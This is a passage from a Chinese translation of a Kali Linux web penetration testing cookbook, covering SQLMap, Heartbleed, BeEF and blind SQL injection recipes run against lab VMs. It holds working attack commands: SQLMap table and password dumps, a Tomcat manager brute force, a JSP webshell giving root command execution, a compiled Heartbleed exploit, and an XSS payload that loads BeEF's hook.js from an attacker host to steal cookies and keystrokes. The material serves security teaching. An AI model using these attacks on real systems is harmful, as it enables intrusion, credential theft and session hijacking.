6.  一旦 SQLMap 检测到应用所使用的 DBMS，它会询问我们是否跳过检测其它 DBMS 的步骤，以及是否打算包含所有特定系统的测试。即使它们在当前的配置等级和风险之外。这里，我们回答`Ues`来跳过其它系统，以及`No`来包含所有测试。

7.  一旦我们指定的参数中发现了漏洞，SQLMap 会询问我们是否打算测试其它参数，我们回答`No`，之后观察结果：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-8-2.jpg)
    
8.  如果我们打开获得用户名和密码，类似于我们在上一个秘籍那样，我们需要知道含有这些信息的表名称。在终端中执行下列代码：

    ```
    sqlmap -u "http://192.168.56.102/mutillidae/index.php?page=userinfo.php&username=test&password=test&user-info-php-submitbutton=View+Account+Details" -p username -D nowasp --tables
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-8-3.jpg)
    
    SQLMap 会保存所执行的注入日志，所以第二次攻击会花费更少的时间。你可以看到，我们指定了要提取信息（nowasp）的数据库，并告诉 SQLMap 我们想获取这个数据库的表名称列表。
    
9.  `accounts`表使含有我们想要的信息的表之一。让我们转储内容：

    ```
    sqlmap -u "http://192.168.56.102/mutillidae/index.php?page=userinfo.php&username=test&password=test&user-info-php-submitbutton=View+Account+Details" -p username -D nowasp -T accounts --dump
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-8-4.jpg)
    
    我们现在拥有完整的用户表，并且我们可以看到，这里密码并没有加密，所以我们可以直接使用它们。
    
### 工作原理

SQLMap 会使用 SQL 注入字符串，对给定 URL 和数据的输入进行模糊测试，或者只针对`-p`选项中的特定目标，并且解释其响应来发现是否存在漏洞。不要模糊测试所有输入，最好使用 SQLMap 来利用我们已知存在的注入，并始终尝试缩小搜索过程，通过提供所有可用的信息，例如漏洞参数、DBMS 类型，以及其它。在所有可能性下寻找注入会花费大量时间，并在网络中产生非常大的流量。

这个秘籍中，我们已经知道了用户名参数存在注入漏洞（因为我们使用了 Mutillidae 的注入测试页面）。在第一个攻击中，我们只希望确认注入是否存在，并询问一些非常基本的信息：用户名（`--curent-user`）和数据库名称（`--current-db`）。

在第二个攻击中，我们使用`-D`选项，以及前一次攻击所获得的名称，指定希望查询的数据库，我们也使用`--tables`询问了所包含的表名称。

知道我们希望获得哪个表（`-T accounts`）之后，我们告诉 SQLMap 使用`--dump`转储它的内容。

### 更多

SQLMap 也能够注入 POST 参数中的输入变量。我们只需要添加`--data`选项并附带 POST 数据，例如：

```
--data "username=test&password=test"
```

有时候，我们需要在一些应用中获得身份验证，以便能够访问应用的漏洞 URL。如果是这样，我们可以传递有效的会话 Cookie 给 SQLMap， 使用`--cookie`选项：

```
--cookie "PHPSESSID=ckleiuvrv60fs012hlj72eeh37" 
```

这在测试 Cookie 值的注入时也非常有用。

另一个有趣的特性是，使用` --sql-shell`选项，它可以为我们提供 SQL shell，其中我们可以执行 SQL 查询，就像我们直接连接到数据库那样。或更有趣的是，我们可以使用` --osshell`在数据库服务器中执行系统命令（在注入 MSSQL 服务器时特别有用）。

为了了解 SQLMap 拥有的所有选项和特性，你可以执行：

```
sqlmap --help
```

### 另见

Kali 包含了用于检测和利用 SQL 注入漏洞的其它工具，它们能够用于代替或配合 SQLMap：

+   sqlninja：非常流行的工具，为利用 MSSQL 服务器而设计。
+   Bbqsql：Python 编写的 SQL 盲注框架。
+   jsql：基于 Java 的工具，带有完全自动化的 GUI，我们只需要输入 URL 并按下按钮。
+   Metasploit：它包含不同 DBMS 的多种 SQL 注入模块。

## 6.9 使用 Metasploit 攻击 Tomcat 的密码

Apache Tomcat，是世界上最广泛使用的 Java Web 服务器之一。带有默认配置的 Tomcat 服务器非常容易发现。发现暴露 Web 应用管理器的服务器也非常容易，它是一个应用，允许管理员启动、停止、添加和删除服务器中的应用。

这个秘籍中，我们会使用 Metasploit 模块来执行 Tomcat 服务器上的字典攻击来获得管理器应用的访问。

### 准备

在我们开始使用 Metasploit 之前，我们需要在 root 终端中开启数据库服务：

```
service postgresql start
```

### 操作步骤

1.  启动 Metasploit 的控制台。

    ```
    msfconsole
    ```

2.  启动之后，我们需要加载合适的模块，在`msf>`提示符之后键入下列代码：

    ```
    use auxiliary/scanner/http/tomcat_mgr_login 
    ```
    
3.  我们可能打算查看它使用什么参数：

    ```
    show options
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-9-1.jpg)
    
4.  现在，我们设置目标主机：

    ```
    set rhosts 192.168.56.102
    ```
    
5.  为了使它更快，但是不要太快，我们增加线程数：

    ```
    set threads 5
    ```
    
6.  同时，我们不希望让我们的服务器由于太多请求而崩溃，所以我们降低爆破的速度：

    ```
    set bruteforce_speed 3 
    ```
    
7.  剩余参数刚好适用于我们的情况，让我们执行攻击：

    ```
    run
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-9-2.jpg)
    
    在一些尝试中失败之后，我们发现了有效的密码，它使用`[+]`标记。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-9-3.jpg)
    
### 工作原理

通常 Tomcat 使用 TCP 8080，它的管理器应用位于`/manager/html`中。这个应用使用基本的 HTTP 验证。我们刚刚使用的 Metasploit 辅助模块（`tomcat_mgr_login`）有一些值得提及的配置项：

+   `BLANK_PASSWORDS`：对每个尝试的用户添加空密码测试。

+   `PASSWORD`：如果我们打算测试多个用户的单一密码，或者添加列表中没有包含的项目，这就很实用。

+   `PASS_FILE`：用于测试的密码列表。

+   `Proxies`：如果我们需要通过代理来访问我们的目标，或者避免检测，就用这个选项。

+   `RHOSTS`：单个主机，或多个（使用空格分隔），或者我们想要测试的主机列表文件（`/path/to/file/with/hosts`）。

+   `RPORT`：Tomcat 所使用的 TCP 端口。

+   `STOP_ON_SUCCESS`：发现有效密码之后停止尝试。

+   `TARGERURI`：主机中管理器应用的位置。

+   `USERNAME`指定特殊的用户名来测试，它可以被单独测试，或者添加到定义在`USER_FILE`的列表中。

+   `USER_PASS_FILE`：包含要被测试的“用户名 密码”组合的文件。

+   `USER_AS_PASS`：将每个列表中的用户名作为密码尝试。

### 另见

这个攻击也可以由 Hydra 执行，使用`http-head`作为服务，`-L`选项来加载用户列表，`-P`选项来加载密码。

## 6.10 使用 Tomcat 管理器来执行代码

上一个秘籍中，我们获得了 Tomcat 管理器的身份认证，并提到了它可以让我们在服务器中执行代码。这个秘籍中，我们会使用它来登录管理器并上传新的应用，这允许我们在服务器中执行操作系统命令。

### 操作步骤

1.  访问`http://192.168.56.102:8080/manager/html`。

2.  被询问用户名和密码时，使用上一个秘籍中获得的：`root`和`owaspbwa`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-10-1.jpg)

3.  一旦进入了管理器，寻找` WAR file to deploy `并点击`Browse`按钮。

4.  Kali 在`/usr/share/laudanum`包含了一些 webshall，在这里浏览它们并选择文件`/usr/share/laudanum/jsp/cmd.war`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-10-2.jpg)
    
5.  加载之后点击`Deploy`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-10-3.jpg)

6.  确保存在新的叫做`cmd`的应用。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-10-4.jpg)
    
7.  让我们试一试，访问`http://192.168.56.102:8080/cmd/cmd.jsp`。

8.  在文本框中尝试命令，例如`ifconfig`：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-10-5.jpg)
    
9.  我们可以看到，我们可以执行命令，但是为了弄清楚我们拥有什么用户和什么权限，尝试`whoami`命令：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/6-10-6.jpg)
    
    我们可以看到，Tomcat 在这台服务器中运行在 root 权限下。这意味着我们这里拥有它的全部控制权，并且能够执行任何操作，例如创建或删除用户，安装软件，配置操作系统选项，以及其它。
    
### 工作原理

一旦我们获得了 Tomcat 管理器的身份认证，攻击过程就相当直接了。我们仅仅需要足以让我们上传它的应用。Laudanum 默认包含在 Kali 中，是多种语言和类型的 webshell 的集合，包括 PHP、ASP、 ASP.NET 和 JSP。对渗透测试者来说，什么比 webshell 更有用呢？

Tomcat 能够接受以 WAR（Web 应用归档）格式打包的 Java Web 应用并将其部署到服务器上。我们刚刚使用了这一特性来上传 Laudanum 中的 webshell。在它上传和部署之后，我们浏览它并且通过执行系统命令，我们发现我们拥有这个系统的 root 访问。


# 第七章：高级利用

> 作者：Gilberto Najera-Gutierrez

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

在获得一些便利来发现和利用漏洞之后，我们现在转向可能需要更多努力的其他问题上。

这一章中，我们会搜索利用，编译程序，建立服务器以及破解密码，这可以让我们访问敏感信息，并执行服务器和应用中的特权功能。

## 7.1 在 Exploit-DB 中搜索 Web 服务器的漏洞

我们偶尔会在操作系统中， Web 应用所使用的库中，以及活动服务中发现服务器漏洞，或者可以在浏览器或 Web 代理中不能利用的安全问题。对于这些情况，我们可以使用 Metasploit 的利用集合，或者如果我们要找的不在 Metasploit 里面，我们可以在 Exploit-DB 中搜索它。

Kali 包含了 Exploit-DB 中的利用的离线副本。这个秘籍中，我们会使用 Kali 自带的命令来探索这个数据库并找到我们需要的利用。

### 操作步骤

1.  打开终端。

2.  输入下列命令：

    ```
    searchsploit heartbleed
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-1-1.jpg)
    
3.  下一步是将利用复制到一个可以修改的地方，并编译它，像这样：

    ```
    mkdir heartbleed 
    cd heartbleed 
    cp /usr/share/exploitdb/platforms/multiple/remote/32998.c 
    ```
    
4.  通常，利用在第一行包含一些自身信息，以及如何使用它们，像这样：

    ```
    head -n 30 32998.c
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-1-2.jpg)
    
5.  这里，利用使用 C 编写，所以我们需要将它编译来使用。编译命令在文件中显示（`cc -lssl -lssl3 -lcrypto heartbleed.c -o heartbleed`），它在 Kali 中不起作用，所以我们需要下面这个：

    ```
    gcc 32998.c -o heartbleed -Wl,-Bstatic -lssl -Wl,-Bdynamic -lssl3 -lcrypto
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-1-3.jpg)
    
### 工作原理

`searchsploit `命令是安装在 Kali 中的 Exploit-DB 本地副本的接口。它用于在利用的标题和描述中搜索字符串，并显示结果。

利用存在于`/usr/share/exploitdb/platforms `目录中。`searchsploit `所展示的利用目录是它的相对路径，这就是我们在复制文件的时候使用完整路径的原因。利用文件以利用编号命名，在它们被提交到 Exploit-DB 时分配。

编译步骤和在源代码中的推荐有些不同，因为 OpenSSL 库在基于 Debian 的发行版中，由于它们从源代码中构建的方式而缺少一些功能。

### 更多

监控利用的影响和效果极其重要，因为我们在实时系统中使用它。通常，Exploit-DB 中的利用都值得相信，即使它们通常需要一些调整来工作在特定的环境中，但是它们中有一些不像他们所说的那样。出于这个原因，在真实世界的渗透测试中使用之前，我们需要检查源代码并在我们的实验环境中测试它们。

### 另见

除了 Exploit-DB（`www.exploit-db.com`），也有一些其他站点可以用于搜索目标系统中的已知漏洞和利用：

+ http://www.securityfocus.com 
+ http://www.xssed.com/ 
+ https://packetstormsecurity.com/
+ http://seclists.org/fulldisclosure/
+ http://0day.today/

## 7.2 利用 Heartbleed 漏洞

这个秘籍中，我们会使用之前编译的 Heartbleed 利用来提取关于存在漏洞的 Bee-box 服务器的信息（`https://192.168.56.103:8443/ `）。

Bee-box 虚拟机可以从`https://www.vulnhub.com/ entry/bwapp-bee-box-v16,53/ `下载，那里也有安装指南。

### 准备

在上一个秘籍中，我们生成了 Heartbleed 利用的可执行文件。我们现在使用它来利用服务器的漏洞。

Heartbleed 是能够从服务器内存中提取信息的漏洞。在尝试利用来获得一些要提取的信息之前，可能需要浏览并向服务器的 8443 端口上的 HTTPS 页面发送数据。

### 操作步骤

1.  如果我们检查 Bee-Box 的 8443 端口，我们会发现它存在 Heartbleed 漏洞。

    ```
    sslscan 192.168.56.103:8443
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-2-1.jpg)
    
2.  现在，让我们开始利用漏洞。手心，我们访问包含可执行利用的文件夹：

    ```
    cd heartbleed
    ```
    
3.  之后我们检查程序的选项，像这样：

    ```
    ./heartbleed --help
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-2-2.jpg)
    
4.  我们要尝试利用`192.168.56.103 `的 443 端口，获得最大的泄露并保存输出到文本文件`hb_test.txt`。

    ```
    ./heartbleed -s 192.168.56.103 -p 8443 -f hb_test.txt -t 1
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-2-3.jpg)
    
5.  现在，如果我们检查`hb_test.txt`的内容：

    ```
    cat hb_test.txt
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-2-4.jpg)
    
    我们的利用从 HTTPS 服务器中提取了信息，从这里我们可以看到会话 OD 甚至还有完整的登录请求，包括纯文本用户名和密码。
    
6.  如果我们想要跳过所有的二进制数据，只查看文件中的可读文本，使用`strings`命令：

    ```
    strings hb_test.txt
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-2-5.jpg)
    
### 工作原理

我们在第四章中提到过，Heartbleed 漏洞允许攻击者从 OpenSSL 服务器内存中以纯文本读取信息，这意味着我们不需要解密甚至是解释任何客户端和服务端之间的通信，我们只需简单地向服务器请求内存中的东西，它会回应未加密的信息。

这个秘籍中，我们使用了可公共访问的利用来执行攻击，并获取到至少一个有效的会话 ID。有的时候还可能在 Heartbleed 的转储中找到密码或其它敏感信息。

最后，`strings`命令只展示文件中的字符串，跳过所有特殊字符，使其更加易读。

## 7.3 使用 BeEF 利用 XSS

BeEF，即浏览器利用框架，是个专注于客户端攻击向量的框架，特别是 Web 浏览器的攻击。

这个秘籍中，我们会利用 XSS 漏洞并使用 BeEF 来控制客户端浏览器。

### 准备

在开始之前，我们需要确保启动了 BeEF 服务，并且能够访问`http://127.0.0.1:3000/ui/panel`（使用`beef/beef`身份标识）。

1.  Kali 的默认 BeEF 服务不能工作。所以我们不能仅仅运行`beef-xss`让它启动。我们需要从安装目录中启动它，像这样：

    ```
    cd /usr/share/beef-xss/ 
    ./beef
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-3-1.jpg)
    
2.  现在，浏览`http://127.0.0.1:3000/ui/panel`并使用`beef`作为用户名和密码。如果有效，我们就准备好了。

### 操作步骤

1.  BeEF 需要客户端浏览器调用`hook.js`文件，这用于将浏览器勾到我们的 BeEF 服务器，我们会使用一个存在 XSS 漏洞的应用来使用户调用它。为了尝试简单的 XSS 测试，浏览`http://192.168.56.102/bodgeit/search.jsp?q=%3Cscript%3Ealert%28 1%29%3C%2Fscript%3E`。

2.  这就是存在 XSS 漏洞的应用，所以现在我们需要修改脚本来调用`hook.js`。想象一下你就是受害者，你已经收到了包含` http://192.168.56.102/bodgeit/search.jsp?q=<script src="http://192.168.56.1:3000/hook.js"></script>`链接的邮件，你打算浏览器它来看看，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-3-2.jpg)
    
3.  现在，在 BeEF 面板中，攻击者会看到新的在线浏览器。

4.  攻击者的最佳步骤就是生成一些持久的，至少在用户浏览期间有效。访问攻击者浏览器的`Command`标签页，从这里选择`Persistence | Man-In-The-Browser`之后点击`Execute`。执行之后，选择`Module Results History`中的相关命令来检查结果，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-3-3.jpg)
    
5.  如果我们检查浏览器中的`Logs`标签页，我们可能会看到 BeEF 正在储存用户关于用户在浏览器中执行什么操作的信息，例如输入和点击，我们可以在这里看到：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-3-4.jpg)
    
6.  我们也可以通过使用`Commands | Browser | Hooked Domain | Get Cookie`来获取 Cookie，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-3-5.jpg)
    
### 工作原理

这个秘籍中，我们使用了`script`标签的`src`属性来调用外部 JS 文件，这里是 BeEF 的钩子。

`hook.js`文件与服务器通信，执行命令并返回响应，使攻击者能够看到它们。它在客户端的浏览器中不打印任何东西，所以受害者通常不会知道他的浏览器正在被攻击。

在让受害者执行我们的`hook`脚本之后，我们使用持久化模块  Man In The Browser 使浏览器在每次用户点击链接时，向相同域发送 AJAX 请求，所以这个请求维持了钩子，也加载了新的页面。

我么也会看到，BeEF 的日志记录了用户在页面上执行的每个步骤，我们能够从中获得用户名和密码信息。也可以用来获得远程的会话 Cookie，这可以让攻击者劫持受害者的会话。

### 更多

BeEF 拥有很多功能，从判断受害者所使用的浏览器类型，到利用已知漏洞和完全攻陷客户端系统。一些有趣的特性是：

+   `Social Engineering/Pretty Theft`：这是个社会工程工具，允许我们模拟登陆页面，就像常见的服务那样，例如 Fackbook、Linkedin、YouTube 以及其它。

+   ` Browser/Webcam and Browser/Webcam HTML5`：就像看上去那样，这两个模块能够恶意使用许可配置来激活受害者的摄像头，前者使用隐藏的 Flash `embed`标签，后者使用 HTML5 标签。

+   ` Exploits folder`：这包含一组特殊软件和情况的利用，它们中的一些利用服务和其它客户端浏览器。

+   `Browser/Hooked Domain/Get Stored Credentials`：这会尝试提取浏览器中储存的沦陷域的用户名和密码。

+   ` Use as Proxy`：如果我们右击被勾住的浏览器，我们会获得将其用作代理的选项。这将客户端浏览器用作代理，会给我们机会来探索受害者的内部网络。

BeEF 有许多其它攻击和模块，对渗透测试者非常实用，如果你想要了解更多，你可以查看官方的 Wiki：`https://github.com/ beefproject/beef/wiki`。

## 7.4 利用 SQL 盲注

在第六章中，我们利用了基于错误的 SQL 注入，现在我们使用 Burp Suite Intruder 作为主要工具来识别和利用 SQL 盲注。

### 准备

使浏览器将 Burp Suite 用作代理。

### 操作步骤

1.  浏览` http://192.168.56.102/WebGoat`，实用`webgoat`作为用户名和密码登录。

2.  点击` Start WebGoat`来访问 WebGoat 的主页。

3.  访问` Injection Flaws | Blind Numeric SQL Injection`。

4.  页面上说，练习的目标是找到给定字段在给定行中的值。我们的做事方式有一点不同，但是让我们看看它如何工作：将`101`作为账户号码，并点击`go`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-1.jpg)
    
5.  现在尝试`1011`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-2.jpg)
    
    到目前为止，我们看到了应用的行为，它仅仅告诉我们账户号码是否有效。
    
6.  让我们尝试注入，因为它查找号码，可能将它们用作整数。我们在测试中不使用单引号，所以提交`101 and 1=1`

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-3.jpg)
    
7.  现在尝试`101 and 1=2`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-4.jpg)
    
    看上去这里有个盲注，在有效的账户中注入恒真的条件结果。注入恒假的条件时会出现` Invalid account number`信息。
    
8.  在这个秘籍中，我们要获得连接到数据库的用户名称。所以我们首先需要知道用户名称的长度。让我们尝试一下，注入` 101 AND 1=char_length(current_user)`。

9.  下一步是在 BurpSuite 的代理中寻找最后一个请求，并将它发送到 intruder 中，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-5.jpg)
    
0.  一旦发送到 intruder，我们可以清楚所有载荷标记，并在`AND`后面的`1`中添加新的，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-6.jpg)
    
1.  访问载荷部分并将`Payload type`设为`Numbers`。

2.  将`Payload type`设为`Sequential`，从 1 到 15，步长为 1。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-7.jpg)
    
3.  为了看看响应是否满足要求，访问` Intruder's options`，清除` GrepMatch`列表并添加` Invalid account number`，以及`Account number is valid`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-8.jpg)
    
    我们需要在每个 intruder 的标签页中这样修改。

4.  为了使应用自动化，在`Redirections `中选择`Always`，并在`Redirections`中选择` Process cookies `。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-9.jpg)
    
    我们需要在每个 intruder 的标签页中这样修改。
    
5.  开始攻击

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-10.jpg)
    
    它找到了号码为 2 的有效响应，这意味着用户名只含有两个字符长。
    
6.  现在，我们打算猜测用户名的每个字符，从第一个字符开始。在应用中提交下列代码：` 101 AND 1=(current_user LIKE 'b%')`。

    我们选择`b`作为第一个字符，让 BurpSuite 来获取请求，它应该为任意字符。
    
7.  同样，我们将请求发送给 intruder 并保留唯一的载荷标记`b`，它是名称的首单词。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-11.jpg)
    
8.  我们的载荷应该是含有所有小写字母和大写字母的列表（从 a 到 z 以及 A 到 Z）。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-12.jpg)
    
9.  在 intruder 中重复步骤 13 到 14 并开始攻击，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-13.jpg)
    
    我们的用户名的首字母是`S`。
    
0.  现在，我们需要找到名称的第二个单词，所以我们提交` 101 AND 1=(current_user='Sa')`到应用的文本框，并发送请求给 intruder。

1.  现在我们的载荷标记是`S`后面的`a`，换句话说，名称的第二个字符。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-14.jpg)
    
2.  重复步骤 18 到 19。在我们的例子中，我们只使用了俩表中的大写字母，因为如果第一个单词是大写的，两个单词就很可能都是大写的。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-4-15.jpg)
    
    名称的第二个单词是`A`，所以应用用于执行查询的数据库用户是`SA`。`SA`在 MSSQL 数据库中的意思是系统管理员。
    
### 工作原理

利用 SQL 盲注比起基于错误的注入花费更多精力和时间。在这个秘籍中我们看到了如何获取连接到数据库的用户名，而在第六章的 SQL 注入利用汇总，我们使用了一条命令来获取它。

我们可以使用字典来查看当前用户是否在名称列表中，但是如果名称不在列表中，会花费更多时间。

我们最开始识别了漏洞，所显示的信息告诉我们我们的请求是真是假。

一旦我们知道存在注入，并且正面的响应是什么样子，我们开始询问当前用户的长度，询问数据库，`1`是否是当前用户名的长度，是不是`2`，以此类推，知道我们发现了长度。知道何时停止用户名长度的搜索非常重要。

在找到长度之后，我们使用相同的技巧来发现首字母，` LIKE 'b%' `语句告诉 SQL 解释器是否首字母是`b`，剩下的并不重要，它可以是任何东西（`%`是用于多数 SQL 实现的通配符）。这里，我们看到了首字母是`S`。使用相同的技巧，我们就能发现第二个字符，并得到整个名称。

### 更多

这个攻击可以继续来获得 DBMS 的版本，之后使用厂商特定的命令来观察是否用户拥有管理权限。如果是的话，你可以提取所有用户名和密码，激活远程连接，以及除此之外的许多事情。

你可以尝试的事情之一就是使用 SQLMap 来利用这类型的注入。

还有另一种类型的盲注，它是基于时间的 SQL 盲注。其中我们没有可视化的线索，关于命令是否被执行（就像有效或者无效的账户信息）。反之，我们需要给数据库发送`sleep`命令，如果响应时间鲳鱼我们发送的时间，那么它就是真的响应。这类型的攻击非常缓慢，因为它有时需要等待 30 秒来获得仅仅一个字符。拥有类似 sqlninja 或者 SQLMap 的工具在这种情况下十分有用（`https://www.owasp.org/index.php/Blind_SQL_Injection`）。

## 7.5 使用 SQLMap 获得数据库信息

在第六章中，我们使用了 SQLMap 来从数据库提取信息和表的内容。这非常实用，但是这不仅仅是这个工具的优势，也不是最有趣的事情。这个秘籍中，我们会将其用于提取关于数据库用户和密码的信息，这可以让我们访问整个系统，而不仅仅是应用。

### 操作步骤

1.  启动 Bee-box 虚拟机之后，将 BurpSuite 监听用做代理，登录和选择 SQL 注入漏洞（POST/Search）。

2.  输入任何电影名称并点击`Search`。

3.  现在让我们访问 BuirpSuite 并查看请求：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-5-1.jpg)
    
4.  现在，在 Kali 中访问终端并输入以下命令：

    ```
    sqlmap -u "http://192.168.56.103/bWAPP/sqli_6.php" --cookie="PHPS ESSID=15bfb5b6a982d4c86ee9096adcfdb2e0; security_level=0" --data "title=test&action=search" -p title --is-dba
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-5-2.jpg)
    
    我们可以看到注入成功了。当前的用户是 DBA，这意味着用户可以对数据库执行管理员操作，例如添加用户和修改密码。
    
5.  现在我们打算提取更多信息，例如用户和密码，所以在终端中输入以下命令：

    ```
    sqlmap -u "http://192.168.56.103/bWAPP/sqli_6.php" --cookie="PHPS ESSID=15bfb5b6a982d4c86ee9096adcfdb2e0; security_level=0" --data "title=test&action=search" -p title --is-dba --users --passwords
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-5-3.jpg)
    
    我们现在得到了数据库的用户列表以及哈希后的密码。
    
6.  我们也可以获得 shell，让我们能够直接发送 SQL 查询到数据库。

    ```
    sqlmap -u "http://192.168.56.103/bWAPP/sqli_6.php" --cookie="PHPS ESSID=15bfb5b6a982d4c86ee9096adcfdb2e0; security_level=0" --data "title=test&action=search" -p title –sql-shell
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-5-4.jpg)
    
### 工作原理

一旦我们知道了存在 SQL 注入，我们使用 SQLMap 来利用它，像这样：

```
sqlmap -u "http://192.168.56.103/bWAPP/sqli_6.php" --cookie="PHPS ESSID=15bfb5b6a982d4c86ee9096adcfdb2e0; security_level=0" --data "title=test&action=search" -p title --is-dba
```

在这个对 SQLMap 的调动中，我们使用了`--cookie`参数来发送会话 Cookie 因为应用需要身份验证来访问`sqli_6.php `页面。`--data`参数包含发送到服务器的 POST 数据，`=p`告诉 SQLMap 仅仅注入`title`参数，`--is-dba`询问数据库当前用户是否拥有管理员权限。

DBA 允许我们向数据库询问其他用户的信息，SQLMap 通过`--users`和`--passwords`使我们的操作变得更加容易。这些参数询问用户名和密码，因为所有 DBMS 将用户的密码加密存储，我们获得的只能是哈希。所以我们仍然要使用密码破解器来破解它们。如果你在 SQLMap 询问你执行字典攻击的时候回答`Yes`，你可能就知道了至少一个用户的密码。

我们也使用了`--sql-shell`选项来从我们向数据库发送的 SQL 查询中获得 shell。这并不是真的 shell，当然，SQLMap 通过 SQL 注入发送我们写的命令，并返回这些查询的结果。

## 7.6 执行 CSRF 攻击

CSRF 攻击强迫身份验证后的用户在 Web 应用中执行需要身份验证的，非预期的行为。这可以通过用户所浏览的外部站点触发该行为来实现。

这个秘籍中，我们会获取应用中的信息，来观察攻击站点是否能够发送有效的请求给漏洞服务器。之后，我们会创建页面来模拟正常请求并诱使用户在身份验证后访问这个页面。恶意页面之后会发送请求给漏洞服务器，如果应用在相同浏览器中打开，它会执行操作，好像用户发送了它们。

### 准备

为了执行 CSRF 攻击，我们使用 vulnerable_vm 中的 WackoPicko 应用：`http://192.168.56.102/WackoPicko`。我们需要两个用户，一个叫做`v_user`，是受害者，另一个叫做`attacker`。

我们也需要启动 BurpSuite 并将其配置为服务器的代理。

### 操作步骤

1.  作为`attacker`登录 WackoPicko。

2.  攻击者首先需要了解应用的行为，所以如果我们发酸使用户购买我们的图片，将 BurpSuite 用作代理，我们需要浏览：` http://192.168.56.102/WackoPicko/pictures/recent.php `。

3.  选项 ID 为 8 的图片：` http://192.168.56.102/WackoPicko/ pictures/view.php?picid=8`。

4.  点击`Add to Cart`。

5.  会花费我们 10 个 Tradebux，但这是值得的，所以点击` Continue to Confirmation`。

6.  在下一页上，点击`Purchase`。

7.  现在，让我们访问 BurpSuite 来分析发生了什么。

    第一个有趣的调用是`/WackoPicko/cart/action. php?action=add&picid=8 `，它是添加图片到购物车的请求。`/WackoPicko/cart/confirm.php`在我们点击相应按钮时调用，它可能必须用于购买。另一个可被攻击者利用的是购买操作的 POST 调用：`/WackoPicko/cart/action. php?action=purchase`，他告诉应用将图片添加到购物车中并收相应的 Tradebux。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-6-1.jpg)
    
